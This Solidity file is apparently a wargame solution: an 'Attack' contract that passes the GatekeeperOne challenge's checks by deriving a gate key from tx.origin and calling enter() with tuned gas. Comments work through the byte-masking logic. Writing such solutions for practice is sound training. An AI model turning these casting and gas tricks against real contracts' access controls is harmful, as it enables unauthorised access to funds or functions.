// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";


contract Attack {
    GatekeeperOne target;

    constructor(GatekeeperOne _target) {
        target = _target;
    }

    function _constructGateKey() private view returns (bytes8 gateKey) {
        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
        gateKey = bytes8(
            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
        );
        return gateKey;
    }

    function hack(uint256 gas) external {   
        
        uint64 uintKey = uint64(uint160(address(msg.sender)));    
        // bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;  
        bytes8 key = _constructGateKey();  
        (bool sent,) = address(target).call{gas: 8191 * 20 + gas}(abi.encodeWithSignature("enter(bytes8)", key));    
        require(sent, "Transaction failed");

      // modifier gateThree(bytes8 _gateKey) {
      //   require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one"); 
      //   require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      //   require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
      //   _;
      // }
      // bytes8 _gateKey => 0x B1 B2 B3 B4 B5 B6 B7 B8
      // uint64(_gateKey) => numerical representation of gatekeep no data loss

      // Requirement1
      // (uint32(uint64(_gateKey))) => the first half of the data is lost => leaving B5 B6 B7 B8
      // uint16(uint64(_gateKey)) the last four bytes of data remains => leaving B7 B8
      // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey) => B5 B6 B7 B8 == 00 00 B7 B8

      // Requirement2
      // uint32(uint64(_gateKey)) != uint64(_gateKey) => B5 B6 B7 B8 != B1 B2 B3 B4 B5 B6 B7 B8 => B1 B2 B3 B4 must not be 00 00 00 00

      // Requirement3
      // uint160(tx.origin) => uint160 = 20bytes = 160/8 = ethereum address length
      // uint160 converts an address to its numerical representation
      // uint16(uint160(tx.origin)) => leaves the last two bytes of the address
      // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) => B5 B6 B7 B8 == the last two bytes of the address
      // from requirement one B5 B6 B7 B8 == 00 00 B7 B8 => 00 00 B7 B8 == the last two bytes of the address

      // SUMMARY
      // Req1 => B5 B6 = 00 00
      // Req2 => B1 B2 B3 B4 must not be 00 00 00 00 
      // Req3 => B7 B8 == the last two bytes of the address

      // GAS LEFT
      // (gasleft() + k) + gas used
      // brute force to get the gas used 


      // SOLUTION Bitmasking
      // 0xffffffff = 1111 1111 1111 1111 => 0xffffffff0000ffff
      // Req1 => B5 B6 = 00 00
      // Req2 => B1 B2 B3 B4 must not be 00 00 00 00 => uint64(msg.sender)
      // Req3 => B7 B8 == the last two bytes of the address
      // bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF)

      /*

      bytes8 _gateKey;

      uint64 k = uint64(_gateKey); 
      uint16 k16 = uint16(uint160(tx.origin));

      uint32(k) == uint16(k);
      uint32(k) != k;
      uint32(k) == k16;
        

      target.enter(_gateKey);

      */


      
    }
}
